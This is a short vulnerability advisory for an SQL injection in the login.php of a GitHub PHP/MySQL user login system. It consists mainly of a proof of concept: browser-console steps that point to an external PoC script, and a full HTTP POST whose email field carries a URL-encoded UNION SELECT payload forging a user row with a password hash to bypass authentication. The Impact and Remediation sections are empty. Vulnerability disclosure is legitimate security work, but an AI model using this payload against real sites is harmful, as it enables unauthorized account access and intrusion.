# keerti1924 / PHP-MYSQL-User-Login-System - login.php SQL Injection

## Vendor Homepage:
[PHP-MYSQL-User-Login-System](https://github.com/keerti1924/PHP-MYSQL-User-Login-System)

## Impact

## Proof of Concept
Step 1: Visit the /login.php
Step 2: Open Browser Console
Step 3: Run [SQLI Auth POC](https://raw.githubusercontent.com/skid-nochizplz/skid-nochizplz/main/TrashBin/CVE/keerti1924%20PHP-MYSQL-User-Login-System/SQLI%20Auth%20POC.js)
Step 4: User will be redirected to home.php

## HTTP Request Example

```http request
POST /login.php HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

email = '%20UNION%20SELECT%201%20AS%20id%2c%20'NoChizPlz'%20AS%20username%2c%20'nochizplz%40nochizplz.com'%20AS%20email%2c%20'%242a%2412%24xkhwduBCkSl3tPhWVokC%2fOmrhboA0gxDWaVLl4uPLr2iSbXEtNdCq'%20AS%20password%20%23&password=nochizplz&login=Login
```

### Proof with Video:
![Vulnerability Proof](https://github.com/skid-nochizplz/skid-nochizplz/blob/main/TrashBin/CVE/keerti1924%20PHP-MYSQL-User-Login-System/SQLI%20Auth%20Proof.gif?raw=true)

## Remediation

## CWE
[CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')](https://cwe.mitre.org/data/definitions/89.html)